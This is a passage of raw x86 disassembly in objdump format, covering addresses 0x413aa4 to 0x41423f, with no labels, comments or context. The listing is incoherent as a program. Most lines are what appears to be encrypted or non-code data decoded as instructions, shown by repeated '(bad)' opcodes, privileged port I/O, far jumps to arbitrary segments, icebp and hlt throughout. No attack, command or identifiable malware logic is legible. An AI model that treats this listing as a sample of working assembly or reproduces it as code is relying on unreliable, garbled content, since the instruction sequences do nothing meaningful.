  413aa4:	pusha  
  413aa5:	jno    0x413a56
  413aa7:	aam    0xe7
  413aa9:	sub    BYTE PTR [edx-0x67],cl
  413aac:	mov    dl,0xd9
  413aae:	cmp    cl,BYTE PTR [eax]
  413ab0:	pop    es
  413ab1:	xchg   ecx,eax
  413ab2:	adc    DWORD PTR [edi],ebp
  413ab4:	repnz ins BYTE PTR es:[edi],dx
  413ab6:	sub    al,0x47
  413ab8:	test   BYTE PTR [ebx+0x3f],0xb5
  413abc:	xor    al,0xbc
  413abe:	in     eax,0x35
  413ac0:	dec    eax
  413ac1:	ss mov ecx,0x4eaf96ed
  413ac7:	cmp    cl,BYTE PTR [edx+0x56602ba9]
  413acd:	retf   0xa124
  413ad0:	add    bl,ch
  413ad2:	and    BYTE PTR [edi+edx*8-0x55],0x11
  413ad7:	mov    ecx,0x2540a1fa
  413adc:	addr16 rol eax,cl
  413adf:	mov    ds:0xd6479cea,eax
  413ae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ae5:	stc    
  413ae6:	out    dx,eax
  413ae7:	jmp    0x7728:0x7082acf2
  413aee:	pop    edx
  413aef:	and    eax,DWORD PTR [edi-0x56]
  413af2:	cdq    
  413af3:	jp     0x413b39
  413af5:	daa    
  413af6:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  413af8:	out    dx,ax
  413afa:	cmp    al,0x23
  413afc:	stos   BYTE PTR es:[edi],al
  413afd:	(bad)  
  413afe:	jecxz  0x413aaf
  413b00:	inc    edi
  413b01:	pop    edi
  413b02:	mov    eax,ds:0xa5d3de7b
  413b07:	mov    ds:0xfee0db9,eax
  413b0c:	stc    
  413b0d:	loope  0x413aaf
  413b0f:	inc    edi
  413b10:	repz das 
  413b12:	fcom   QWORD PTR [eax]
  413b14:	pop    ebp
  413b15:	das    
  413b16:	popa   
  413b17:	adc    BYTE PTR [edi-0x4ab1df7f],al
  413b1d:	adc    eax,0x63f68cbb
  413b22:	mov    bl,0x24
  413b24:	and    al,0x16
  413b26:	pushf  
  413b27:	cmp    eax,0xb1ecfa51
  413b2c:	sbb    al,0x7f
  413b2e:	jae    0x413ad7
  413b30:	and    al,0x90
  413b32:	mov    ebp,0xb7db7718
  413b37:	xor    DWORD PTR [esi],eax
  413b39:	push   ebp
  413b3a:	add    dh,ch
  413b3c:	js     0x413b72
  413b3e:	dec    esp
  413b3f:	push   0xe8a190ff
  413b44:	es icebp 
  413b46:	sbb    eax,0xca6128fd
  413b4b:	call   0x3816d5d2
  413b50:	jecxz  0x413bab
  413b52:	rcr    DWORD PTR [esi+0x3c],cl
  413b55:	clc    
  413b56:	pop    edx
  413b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b58:	dec    ebp
  413b59:	xor    edi,edx
  413b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b5c:	push   ecx
  413b5d:	push   esi
  413b5e:	cmp    ebp,edx
  413b60:	xchg   edi,eax
  413b61:	mov    fs,WORD PTR [edx]
  413b63:	aas    
  413b64:	xchg   esi,eax
  413b65:	scas   eax,DWORD PTR es:[edi]
  413b66:	dec    ebx
  413b67:	retf   
  413b68:	fidivr DWORD PTR [ecx]
  413b6a:	ss mov ebx,0xe4ee189a
  413b70:	rdtsc  
  413b72:	(bad)  
  413b73:	(bad)  
  413b74:	lock mov bl,0x30
  413b77:	into   
  413b78:	add    eax,ecx
  413b7a:	jl     0x413b65
  413b7c:	jle    0x413b0b
  413b7e:	int    0x5f
  413b80:	clc    
  413b81:	rcr    BYTE PTR [edx-0x566e1384],cl
  413b87:	aam    0x50
  413b89:	push   cs
  413b8a:	and    al,bh
  413b8c:	dec    edx
  413b8d:	and    ecx,DWORD PTR ds:0x4d58f6ed
  413b93:	mov    dl,0xfb
  413b95:	mov    bh,0x5d
  413b97:	out    dx,al
  413b98:	stos   BYTE PTR es:[edi],al
  413b99:	clc    
  413b9a:	mov    ebp,0xe201393b
  413b9f:	pop    es
  413ba0:	mov    al,0xd4
  413ba2:	not    BYTE PTR [ebp+ebx*2+0x68]
  413ba6:	cli    
  413ba7:	clc    
  413ba8:	push   ecx
  413ba9:	psraw  mm6,QWORD PTR [eax]
  413bac:	(bad)  
  413bad:	adc    DWORD PTR [ecx],ecx
  413baf:	imul   eax
  413bb1:	out    0xa3,eax
  413bb3:	das    
  413bb4:	add    BYTE PTR [esi],0x4d
  413bb7:	fcom   QWORD PTR [esi]
  413bb9:	sar    dl,1
  413bbb:	xchg   ecx,eax
  413bbc:	xor    eax,0x7fb9dfa5
  413bc1:	add    eax,ecx
  413bc3:	jbe    0x413b51
  413bc5:	sar    ch,0xec
  413bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bc9:	sbb    edi,DWORD PTR [ebx+ebp*1]
  413bcc:	test   bl,dh
  413bce:	loop   0x413bc1
  413bd0:	mov    cl,0x59
  413bd2:	lds    esi,FWORD PTR ds:0xe1c8b25c
  413bd8:	sub    ch,BYTE PTR [ebx+edx*4+0x4d]
  413bdc:	aam    0x69
  413bde:	pusha  
  413bdf:	mov    esi,0xc07ddf02
  413be4:	fwait
  413be5:	popf   
  413be6:	cmp    edx,DWORD PTR [edx]
  413be8:	or     ch,BYTE PTR [esi+eax*8-0x4b8fde65]
  413bef:	dec    BYTE PTR [ecx+0x36]
  413bf2:	je     0x413c2b
  413bf4:	jnp    0x413bf9
  413bf6:	aam    0xe
  413bf8:	fisubr WORD PTR [esi+0x26]
  413bfb:	and    eax,0xe8b7c97a
  413c00:	idiv   eax
  413c02:	cmp    ebp,esp
  413c04:	dec    esp
  413c05:	pop    esp
  413c06:	dec    esi
  413c07:	add    eax,DWORD PTR [edi+0x70]
  413c0a:	ins    BYTE PTR es:[edi],dx
  413c0b:	pop    ds
  413c0c:	aaa    
  413c0d:	je     0x413bab
  413c0f:	lahf   
  413c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c11:	adc    eax,0xf703ec88
  413c16:	or     al,bl
  413c18:	xlat   BYTE PTR ds:[ebx]
  413c19:	mov    ebx,0xbce9fac9
  413c1e:	adc    eax,DWORD PTR [esi]
  413c20:	and    al,0xbd
  413c22:	imul   esi,DWORD PTR [ebp+0x4efe32c9],0x1ac3b6b9
  413c2c:	in     eax,0xcf
  413c2e:	or     al,0xec
  413c30:	inc    ebp
  413c31:	fs std 
  413c33:	sub    dl,dh
  413c35:	loopne 0x413c1e
  413c37:	jns    0x413cb3
  413c39:	retf   0x740a
  413c3c:	pop    esi
  413c3d:	ja     0x413c82
  413c3f:	pop    esi
  413c40:	stos   DWORD PTR es:[edi],eax
  413c41:	push   edx
  413c42:	mov    al,0x82
  413c44:	push   ss
  413c45:	or     ch,ch
  413c47:	ficomp WORD PTR [edx]
  413c49:	sub    BYTE PTR [eax+0x4601bc70],ah
  413c4f:	dec    eax
  413c50:	ret    0x7eb2
  413c53:	sub    eax,0xcdfb3209
  413c58:	mov    ebp,ebp
  413c5a:	dec    bx
  413c5c:	add    ch,BYTE PTR [ebp+eax*8-0x3d]
  413c60:	gs adc eax,0xc7a13dd3
  413c66:	out    0x2f,al
  413c68:	pop    esi
  413c69:	jl     0x413c44
  413c6b:	sub    bl,BYTE PTR [ebx]
  413c6d:	dec    esp
  413c6e:	and    DWORD PTR [edx],0xada95151
  413c74:	gs repnz xor eax,0x2cdf7610
  413c7b:	jae    0x413cdb
  413c7d:	out    dx,eax
  413c7e:	jo     0x413c55
  413c80:	fcmovb st,st(1)
  413c82:	jne    0x413c7d
  413c84:	jp     0x413c1d
  413c86:	ret    0x4563
  413c89:	sbb    eax,0xc2148127
  413c8e:	(bad)  
  413c8f:	cmp    dl,dl
  413c91:	pushf  
  413c92:	inc    ecx
  413c93:	xchg   edx,eax
  413c94:	test   BYTE PTR [ecx+0x2c],dh
  413c97:	dec    esp
  413c98:	loop   0x413c51
  413c9a:	jb     0x413cc1
  413c9c:	and    BYTE PTR [ebp+0x72],bh
  413c9f:	xor    al,cl
  413ca1:	mov    ds:0x55073e2a,eax
  413ca6:	out    0x92,al
  413ca8:	fidiv  WORD PTR [edi-0x517a2dfd]
  413cae:	jo     0x413caa
  413cb0:	in     eax,dx
  413cb1:	retf   
  413cb2:	xchg   ebp,eax
  413cb3:	nop
  413cb4:	push   eax
  413cb5:	adc    esp,DWORD PTR [edi]
  413cb7:	hlt    
  413cb8:	adc    eax,0xc2cbdc71
  413cbd:	test   dl,bh
  413cbf:	mov    eax,ss
  413cc1:	icebp  
  413cc2:	sub    dh,BYTE PTR [esi+0x7c67fac5]
  413cc8:	or     eax,0x7496e607
  413ccd:	adc    eax,0x30d3c96
  413cd2:	cdq    
  413cd3:	(bad)  
  413cd5:	out    dx,eax
  413cd6:	out    0x47,al
  413cd8:	push   edx
  413cd9:	iret   
  413cda:	loopne 0x413d33
  413cdc:	inc    edx
  413cdd:	jmp    0x959b7dcc
  413ce2:	adc    edi,ebx
  413ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ce5:	lods   al,BYTE PTR ds:[esi]
  413ce6:	adc    al,0xd0
  413ce8:	xor    eax,0xa7d71cf2
  413ced:	inc    ebp
  413cee:	je     0x413c79
  413cf0:	sahf   
  413cf1:	out    dx,eax
  413cf2:	sub    BYTE PTR [edx-0x1ded343],al
  413cf8:	stos   BYTE PTR es:[edi],al
  413cf9:	pop    esi
  413cfa:	data16 cli 
  413cfc:	pop    ebx
  413cfd:	nop
  413cfe:	xchg   DWORD PTR [edx+0x50],edi
  413d01:	inc    ebx
  413d02:	pop    edi
  413d03:	fisttp QWORD PTR [ecx-0x5b79dc15]
  413d09:	dec    edi
  413d0a:	xor    al,0xd0
  413d0c:	mov    ds,edi
  413d0e:	scas   eax,DWORD PTR es:[edi]
  413d0f:	ins    DWORD PTR es:[edi],dx
  413d10:	mov    WORD PTR [edx+0x6c],ds
  413d13:	lahf   
  413d14:	outs   dx,BYTE PTR ds:[esi]
  413d15:	test   edx,0xb41ad016
  413d1b:	ss dec eax
  413d1d:	retf   
  413d1e:	push   ss
  413d1f:	mov    dh,0x2f
  413d21:	xchg   ebx,eax
  413d22:	jnp    0x413d06
  413d24:	std    
  413d25:	(bad)  
  413d26:	aad    0xb2
  413d28:	mov    BYTE PTR [ebx],ch
  413d2a:	ds sub eax,0x64bca402
  413d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d31:	ret    0xa469
  413d34:	adc    BYTE PTR [ebp-0x53367e2],0xc
  413d3b:	imul   eax,DWORD PTR [eax],0x901389f2
  413d41:	idiv   DWORD PTR [esi-0x3b78f9a9]
  413d47:	jg     0x413d6f
  413d49:	gs (bad) 
  413d4b:	sub    DWORD PTR [edi+0x47da53a],esp
  413d51:	aad    0x9c
  413d53:	(bad)  
  413d54:	aam    0xe0
  413d56:	xchg   esi,eax
  413d57:	sub    edx,edi
  413d59:	push   cs
  413d5a:	retf   0x6649
  413d5d:	jns    0x413cee
  413d5f:	hlt    
  413d60:	mov    bh,0x8c
  413d62:	mov    DWORD PTR [eax],eax
  413d64:	fwait
  413d65:	ror    DWORD PTR [edx+0x53],cl
  413d68:	mov    ds:0x964a6d00,al
  413d6d:	(bad)  
  413d6e:	(bad)  
  413d6f:	and    esi,DWORD PTR [edx]
  413d71:	dec    esp
  413d72:	in     al,dx
  413d73:	sub    BYTE PTR [ebp-0x50],bh
  413d76:	enter  0x54a0,0xa5
  413d7a:	mov    dl,0xde
  413d7c:	xor    DWORD PTR [ebp+0x61f874ae],ebp
  413d82:	jp     0x413d13
  413d84:	out    0x91,eax
  413d86:	push   edx
  413d87:	ror    bh,0xe7
  413d8a:	and    DWORD PTR [eax+0x7f21db37],esi
  413d90:	push   esp
  413d91:	adc    dh,ch
  413d93:	in     al,0x6e
  413d95:	xor    al,0xbc
  413d97:	and    cl,BYTE PTR [ebx+0x18]
  413d9a:	bnd jb 0x413de8
  413d9d:	std    
  413d9e:	fst    DWORD PTR [esi]
  413da0:	push   ebp
  413da1:	push   es
  413da2:	xchg   esp,esi
  413da4:	mov    al,0x70
  413da6:	push   0xffffffa3
  413da8:	fst    DWORD PTR [edx+0x506aa233]
  413dae:	xor    BYTE PTR [esi-0x14],bl
  413db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413db2:	dec    edi
  413db3:	jge    0x413d35
  413db5:	xor    cl,BYTE PTR [edi+ecx*1]
  413db8:	stc    
  413db9:	pop    ds
  413dba:	mov    bh,0xcb
  413dbc:	fidiv  WORD PTR [edi+0x23]
  413dbf:	xlat   BYTE PTR ds:[ebx]
  413dc0:	or     BYTE PTR [ebx],0x60
  413dc3:	adc    DWORD PTR [edx],ebx
  413dc5:	test   DWORD PTR [ebx-0x4a],ecx
  413dc8:	jne    0x413d8e
  413dca:	mov    ebp,0x19e45574
  413dcf:	jge    0x413dee
  413dd1:	sbb    eax,0xd537d642
  413dd6:	jmp    0xd7da0249
  413ddb:	jge    0x413e11
  413ddd:	(bad)  
  413dde:	xchg   edx,eax
  413ddf:	shr    eax,1
  413de1:	adc    DWORD PTR [ebp+0x1f12e7f8],ecx
  413de7:	fild   WORD PTR [edx-0x7c]
  413dea:	jge    0x413e16
  413dec:	(bad)  
  413ded:	out    dx,al
  413dee:	retf   
  413def:	adc    al,0xfc
  413df1:	in     al,0x57
  413df3:	sbb    ecx,ebx
  413df5:	pop    edx
  413df6:	dec    ebp
  413df7:	pop    edx
  413df8:	jle    0x413dcf
  413dfa:	dec    esi
  413dfb:	retf   
  413dfc:	jge    0x413ded
  413dfe:	bound  edi,QWORD PTR [esp+ebx*1-0x49]
  413e02:	sub    al,0xc9
  413e04:	test   DWORD PTR [edx+0x2db74c15],0xd17d78c8
  413e0e:	inc    ebp
  413e0f:	jbe    0x413def
  413e11:	ret    
  413e12:	std    
  413e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e14:	add    eax,0x12d557ca
  413e19:	mov    ebp,0xb59c9658
  413e1e:	inc    esi
  413e1f:	pop    esi
  413e20:	mov    edi,0x7b2959d6
  413e25:	push   cs
  413e26:	neg    BYTE PTR [edi+0x36]
  413e29:	xor    al,0x53
  413e2b:	bound  ecx,QWORD PTR [eax+0x344380f3]
  413e31:	cmp    esi,DWORD PTR [edx-0x3e0dd340]
  413e37:	test   BYTE PTR [eax],ch
  413e39:	lds    ebp,FWORD PTR [eax-0x18]
  413e3c:	ja     0x413e27
  413e3e:	jae    0x413e5b
  413e40:	addr16 hlt 
  413e42:	xor    BYTE PTR [eax*1+0x6744e671],0x90
  413e4a:	jecxz  0x413e09
  413e4c:	pop    ecx
  413e4d:	and    ah,cl
  413e4f:	sub    eax,0xb03c05e8
  413e54:	or     BYTE PTR [ebp-0x7a8844d],dh
  413e5a:	push   0x639303cc
  413e5f:	stos   BYTE PTR es:[edi],al
  413e60:	data16 loopne 0x413e01
  413e63:	daa    
  413e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e65:	mov    ?,WORD PTR [esp+esi*1+0x26]
  413e69:	push   edi
  413e6a:	xor    edx,eax
  413e6c:	jne    0x413e53
  413e6e:	shl    cl,0x71
  413e71:	stos   BYTE PTR es:[edi],al
  413e72:	push   ebx
  413e73:	rol    DWORD PTR [edx-0x4ead79d2],cl
  413e79:	int3   
  413e7a:	loopne 0x413eea
  413e7c:	sar    BYTE PTR [esi-0x54a78bd4],0x75
  413e83:	lods   eax,DWORD PTR gs:[esi]
  413e85:	sub    eax,0x163785c1
  413e8a:	cmp    al,0x36
  413e8c:	int    0x8b
  413e8e:	fild   DWORD PTR [esi+0x4473b8ba]
  413e94:	xor    edx,DWORD PTR [ebp+edx*2-0x8]
  413e98:	and    al,0xca
  413e9a:	pop    edx
  413e9b:	jo     0x413eeb
  413e9d:	mov    ebp,0xd05c1487
  413ea2:	sti    
  413ea3:	repz popf 
  413ea5:	shl    ebp,0x83
  413ea8:	and    dh,0x8f
  413eab:	addr16 pop ebx
  413ead:	cdq    
  413eae:	mov    ebp,0x32578245
  413eb3:	and    BYTE PTR [edx],dl
  413eb5:	aas    
  413eb6:	xor    eax,0x377fd56d
  413ebb:	inc    esp
  413ebc:	es xchg esp,eax
  413ebe:	xor    al,0x6
  413ec0:	neg    DWORD PTR [ecx]
  413ec2:	ror    DWORD PTR [edx+0x6f580341],1
  413ec8:	sub    eax,0x94106246
  413ecd:	cdq    
  413ece:	imul   esi,ebx,0xffffffed
  413ed1:	mov    bh,0x84
  413ed3:	inc    esp
  413ed4:	out    0x85,al
  413ed6:	jecxz  0x413e67
  413ed8:	rcl    DWORD PTR [edi+0x73],cl
  413edb:	fwait
  413edc:	and    BYTE PTR [ebx+0x6],bh
  413edf:	xchg   esi,eax
  413ee0:	popa   
  413ee1:	jae    0x413f5e
  413ee3:	pushf  
  413ee4:	cdq    
  413ee5:	and    BYTE PTR [edi*2+0x55c6a52b],ah
  413eec:	jle    0x413eea
  413eee:	gs dec ebx
  413ef0:	and    al,0x56
  413ef2:	out    dx,eax
  413ef3:	aam    0x2
  413ef5:	cmp    al,0xaa
  413ef7:	cmp    BYTE PTR [ebx],cl
  413ef9:	call   edx
  413efb:	cmp    ah,0xaa
  413efe:	mov    edx,0xad3b84f2
  413f03:	mov    DWORD PTR [eax],eax
  413f05:	mov    ch,0xcd
  413f07:	addr16 jl 0x413f88
  413f0a:	les    edi,FWORD PTR [ebx+0x63ca57f5]
  413f10:	xchg   ah,bl
  413f12:	test   al,0xce
  413f14:	xor    dl,0x5d
  413f17:	mov    al,ds:0xd1e93fdc
  413f1c:	pop    esp
  413f1d:	in     eax,0x93
  413f1f:	pop    esi
  413f20:	lahf   
  413f21:	xchg   ecx,eax
  413f22:	mov    esp,ss
  413f24:	sbb    ah,BYTE PTR ds:0xda72020e
  413f2a:	jnp    0x413f91
  413f2c:	mov    edi,0x92c8962d
  413f31:	or     eax,0xe5460135
  413f36:	(bad)  
  413f37:	push   ds
  413f38:	and    esi,esi
  413f3a:	mov    ds:0x20a93f32,eax
  413f3f:	ret    0x7493
  413f42:	mov    esp,0x71dc379e
  413f47:	out    dx,eax
  413f48:	mov    ecx,0x1dd58397
  413f4d:	test   al,0xc1
  413f4f:	cmp    DWORD PTR [ecx],edx
  413f51:	push   edx
  413f52:	sbb    ebx,ecx
  413f54:	pop    esi
  413f55:	jae    0x413f26
  413f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f58:	mov    DWORD PTR [eax+0x72],edi
  413f5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f5c:	cdq    
  413f5d:	in     eax,dx
  413f5e:	hlt    
  413f5f:	and    bh,bl
  413f61:	push   cs
  413f62:	cld    
  413f63:	ja     0x413f2e
  413f65:	sti    
  413f66:	pop    ss
  413f67:	and    eax,0xb71cbccb
  413f6c:	mov    DWORD PTR [ecx-0x4c],ecx
  413f6f:	arpl   WORD PTR [ecx],cx
  413f71:	xor    bh,al
  413f73:	xchg   DWORD PTR [esi],edx
  413f75:	xor    eax,0xa5b248c1
  413f7a:	add    DWORD PTR [ecx],ecx
  413f7c:	mov    ebx,0xb3b27669
  413f81:	rcl    DWORD PTR [edx-0x7f],1
  413f84:	icebp  
  413f85:	pusha  
  413f86:	inc    ecx
  413f87:	or     ch,BYTE PTR [ebp-0xfbae8f7]
  413f8d:	out    dx,al
  413f8e:	jle    0x413f3d
  413f90:	les    esi,FWORD PTR [ecx-0x4197c05]
  413f96:	mov    bh,0x92
  413f98:	xor    dl,bh
  413f9a:	jnp    0x413f50
  413f9c:	in     al,dx
  413f9d:	enter  0x45ef,0x15
  413fa1:	jno    0x413fc3
  413fa3:	and    esi,DWORD PTR [esi-0x6f9c6ff7]
  413fa9:	pop    ebp
  413faa:	pusha  
  413fab:	loope  0x413fda
  413fad:	pop    esp
  413fae:	inc    ebp
  413faf:	xchg   esi,eax
  413fb0:	fmul   QWORD PTR [ebx-0x5d2ddc6a]
  413fb6:	push   ds
  413fb7:	test   BYTE PTR [esp+edi*4],dh
  413fba:	test   eax,0x7efd3ab2
  413fbf:	inc    ebx
  413fc0:	dec    edi
  413fc1:	in     al,dx
  413fc2:	add    BYTE PTR [ebx-0x47319eb1],ah
  413fc8:	inc    eax
  413fc9:	xchg   eax,edi
  413fcb:	enter  0x5990,0xe2
  413fcf:	and    al,0xf4
  413fd1:	and    al,0x9a
  413fd3:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fd5:	int3   
  413fd6:	lods   eax,DWORD PTR ds:[esi]
  413fd7:	xchg   DWORD PTR [esi+0x6fa5203e],edx
  413fdd:	mov    dl,0xa9
  413fdf:	mov    al,ds:0x5b239ac1
  413fe4:	inc    eax
  413fe5:	imul   ecx,DWORD PTR [edi-0x37],0xffffffd4
  413fe9:	push   eax
  413fea:	stc    
  413feb:	fist   DWORD PTR [esi]
  413fed:	mov    ebx,cs
  413fef:	sbb    DWORD PTR [ecx-0x23],ebp
  413ff2:	ins    BYTE PTR es:[edi],dx
  413ff3:	gs add bh,dl
  413ff6:	inc    ecx
  413ff7:	shl    BYTE PTR [ebx-0x35abfa37],0x33
  413ffe:	sbb    edx,0xffffffee
  414001:	cmp    al,0x52
  414003:	into   
  414004:	lods   eax,DWORD PTR ds:[esi]
  414005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414006:	jl     0x413ffc
  414008:	and    BYTE PTR [edi-0x515936d7],bl
  41400e:	mov    al,0xca
  414010:	call   0x8be8dda5
  414015:	outs   dx,DWORD PTR ds:[esi]
  414016:	std    
  414017:	int    0x2a
  414019:	cld    
  41401a:	stos   DWORD PTR es:[edi],eax
  41401b:	lahf   
  41401c:	addr16 gs cld 
  41401f:	pop    ecx
  414020:	fmul   st(7),st
  414022:	cs xchg ebx,eax
  414024:	jb     0x414078
  414026:	xor    esp,DWORD PTR [ecx]
  414028:	adc    dh,bh
  41402a:	icebp  
  41402b:	jmp    0x17adcda4
  414030:	xor    bh,BYTE PTR ds:0x21768eb0
  414036:	std    
  414037:	jge    0x41407d
  414039:	cmp    DWORD PTR [edx+0x57],esi
  41403c:	retf   
  41403d:	jp     0x414059
  41403f:	push   0x5f6de88
  414044:	retf   
  414045:	pop    ecx
  414046:	and    al,BYTE PTR [esi-0x16]
  414049:	inc    ebx
  41404a:	icebp  
  41404b:	or     bl,dl
  41404d:	jecxz  0x414046
  41404f:	(bad)  
  414050:	(bad)  
  414051:	in     eax,0x6a
  414053:	je     0x41407c
  414055:	mov    ds:0xfe56d275,al
  41405a:	mov    al,ds:0x1e544649
  41405f:	out    dx,eax
  414060:	arpl   WORD PTR [esi+ebp*1+0x64bb7454],bp
  414067:	mov    ebx,0x311889cc
  41406c:	mov    DWORD PTR [eax],edi
  41406e:	idiv   BYTE PTR [ebp-0xad68110]
  414074:	sub    ah,ch
  414076:	mov    edi,0x3d611cab
  41407b:	jbe    0x414049
  41407d:	mov    al,ds:0x710591f7
  414082:	push   es
  414083:	mov    bh,BYTE PTR [edx-0x3e1924e3]
  414089:	sub    al,0xca
  41408b:	fwait
  41408c:	mov    DWORD PTR [edx],ecx
  41408e:	sbb    DWORD PTR [esi],ebx
  414090:	repz mov bh,BYTE PTR cs:[ecx+ebx*8-0x65]
  414096:	div    BYTE PTR [ebx]
  414098:	push   0x13cc4c7e
  41409d:	js     0x414058
  41409f:	mov    edi,0xf168478d
  4140a4:	repnz sub al,0x30
  4140a7:	sub    DWORD PTR [esi],0x92bbf59c
  4140ad:	dec    ebp
  4140ae:	lods   eax,DWORD PTR ds:[esi]
  4140af:	shr    DWORD PTR [ebx-0x72],1
  4140b2:	xor    ah,0xef
  4140b5:	fbld   TBYTE PTR [eax+0x2c]
  4140b8:	(bad)  
  4140b9:	icebp  
  4140ba:	fxch   st(2)
  4140bc:	push   0x5d13d424
  4140c1:	jns    0x4140c5
  4140c3:	mov    esp,0x57d25e42
  4140c8:	mov    ebp,0x67a8ebe6
  4140cd:	mov    esp,0xbf960924
  4140d2:	cmc    
  4140d3:	lods   al,BYTE PTR ds:[esi]
  4140d4:	mov    dh,0x9
  4140d6:	fld    st(4)
  4140d8:	nop
  4140d9:	ds mov dl,0xbc
  4140dc:	aam    0xee
  4140de:	sub    ch,0x18
  4140e1:	push   ebx
  4140e2:	mov    ch,0xab
  4140e4:	hlt    
  4140e5:	jbe    0x4140ab
  4140e7:	sub    bh,BYTE PTR [eax-0x2715a8b9]
  4140ed:	xchg   BYTE PTR [eax],ah
  4140ef:	or     BYTE PTR [ebx+0x3e],bl
  4140f2:	aaa    
  4140f3:	call   0x784a:0xd0c19112
  4140fa:	lock mov dl,0x51
  4140fd:	mov    ds:0x7b32551e,eax
  414102:	test   eax,0x4349632
  414107:	imul   ecx,DWORD PTR [ebx+0x3286fd78]
  41410e:	and    eax,0x91922b18
  414113:	scas   eax,DWORD PTR es:[edi]
  414114:	xchg   ebp,eax
  414115:	pop    ss
  414116:	dec    esi
  414117:	rcr    BYTE PTR [ecx+0x6],0x53
  41411b:	pop    ebp
  41411c:	scas   al,BYTE PTR es:[edi]
  41411d:	daa    
  41411e:	out    dx,al
  41411f:	stos   BYTE PTR es:[edi],al
  414120:	stc    
  414121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414122:	(bad)  
  414123:	push   ss
  414124:	dec    esp
  414125:	and    DWORD PTR [edx+ebx*4],eax
  414128:	test   eax,0x9da5d26
  41412d:	mov    DWORD PTR [ebx+esi*4],edi
  414130:	fsubp  st(1),st
  414132:	repnz aad 0x75
  414135:	outs   dx,BYTE PTR ds:[esi]
  414136:	lods   eax,DWORD PTR ds:[esi]
  414137:	retf   0xd40d
  41413a:	cmp    eax,0xd6a61126
  41413f:	ins    BYTE PTR es:[edi],dx
  414140:	add    eax,0x70b48393
  414145:	stos   DWORD PTR es:[edi],eax
  414146:	fldenv [edi]
  414148:	sbb    DWORD PTR [ecx+0x1c9586a],edx
  41414e:	sbb    esi,DWORD PTR [edi-0x58]
  414151:	xor    eax,0xf474b09f
  414156:	mul    DWORD PTR [edi]
  414158:	push   ebx
  414159:	stos   BYTE PTR es:[edi],al
  41415a:	das    
  41415b:	push   es
  41415c:	test   DWORD PTR [esi-0x7b],edi
  41415f:	dec    ecx
  414160:	sti    
  414161:	pushf  
  414162:	and    eax,ecx
  414164:	pop    ss
  414165:	inc    esp
  414166:	xor    eax,0x289086f7
  41416b:	shl    BYTE PTR [edi+ecx*1],cl
  41416e:	fs daa 
  414170:	scas   eax,DWORD PTR es:[edi]
  414171:	clc    
  414172:	(bad)  
  414173:	pop    es
  414174:	fnstenv [ecx+edx*1]
  414177:	cmc    
  414178:	outs   dx,BYTE PTR ds:[esi]
  414179:	retf   
  41417a:	rcl    DWORD PTR [esi-0x64a241ed],1
  414180:	out    0x4d,al
  414182:	cmp    ecx,DWORD PTR [esi-0x6d83291a]
  414188:	into   
  414189:	cmc    
  41418a:	push   ecx
  41418b:	cmp    al,0x2e
  41418d:	and    edx,esi
  41418f:	bound  ebx,QWORD PTR [edx-0x46]
  414192:	iret   
  414193:	mov    esp,0xe5d04c64
  414198:	sbb    ecx,0xfffffff9
  41419b:	out    0x35,al
  41419d:	xor    ch,BYTE PTR [ecx+0x511f569c]
  4141a3:	sub    BYTE PTR [esi],0x6e
  4141a6:	js     0x414197
  4141a8:	mov    ah,BYTE PTR [esi-0x48fe904e]
  4141ae:	dec    ebp
  4141af:	stc    
  4141b0:	xchg   ecx,eax
  4141b1:	dec    ecx
  4141b2:	mov    al,0xd4
  4141b4:	test   eax,0x5c2b913
  4141b9:	pop    es
  4141ba:	out    0xad,eax
  4141bc:	(bad)  
  4141bd:	sti    
  4141be:	imul   eax,DWORD PTR [ebx+0x6b],0xffffffa1
  4141c2:	mov    dl,0xc9
  4141c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141c5:	ret    
  4141c6:	shl    DWORD PTR [edx+ebp*8+0x5ea9148f],cl
  4141cd:	inc    esi
  4141ce:	fbld   TBYTE PTR [ecx]
  4141d0:	adc    eax,0x355fd2fa
  4141d5:	shl    DWORD PTR [ebp+edx*4+0x49b0850d],1
  4141dc:	fwait
  4141dd:	hlt    
  4141de:	int3   
  4141df:	xchg   BYTE PTR [ecx+0x5e],dl
  4141e2:	lds    ecx,FWORD PTR [edi+0x1158fc5e]
  4141e8:	xchg   esp,eax
  4141e9:	xor    al,0x55
  4141eb:	rol    DWORD PTR ds:[edx],1
  4141ee:	je     0x4141ee
  4141f0:	inc    esi
  4141f1:	xlat   BYTE PTR ds:[ebx]
  4141f2:	xchg   ecx,eax
  4141f3:	or     dl,BYTE PTR [eax-0x2590e93f]
  4141f9:	pop    ebx
  4141fa:	lea    esi,[ebx+0x37]
  4141fd:	and    edx,DWORD PTR [edx]
  4141ff:	ret    0x1e94
  414202:	shl    DWORD PTR [esp+edx*8-0x6b],1
  414206:	or     al,0x6f
  414208:	cmp    BYTE PTR [edi+ebx*4+0x203893b1],0x15
  414210:	out    0xee,eax
  414212:	jg     0x4141dd
  414214:	pop    eax
  414215:	jnp    0x4141f5
  414217:	inc    edx
  414218:	vmaxps xmm7,xmm0,XMMWORD PTR [edx*2-0x7757c9e4]
  414221:	sub    eax,0x320ef38b
  414226:	jnp    0x414282
  414228:	mov    cs,WORD PTR [ecx+0x7]
  41422b:	out    0x9d,al
  41422d:	inc    ebp
  41422e:	inc    esi
  41422f:	mov    ds:0x91c7a10e,eax
  414234:	fbld   TBYTE PTR [eax-0x80]
  414237:	(bad)  
  414238:	mov    cs,WORD PTR [ecx+0x43]
  41423b:	into   
  41423c:	sbb    edi,edi
  41423e:	inc    esi
  41423f:	arpl   WORD PTR [ecx-0x5896f6ab],di
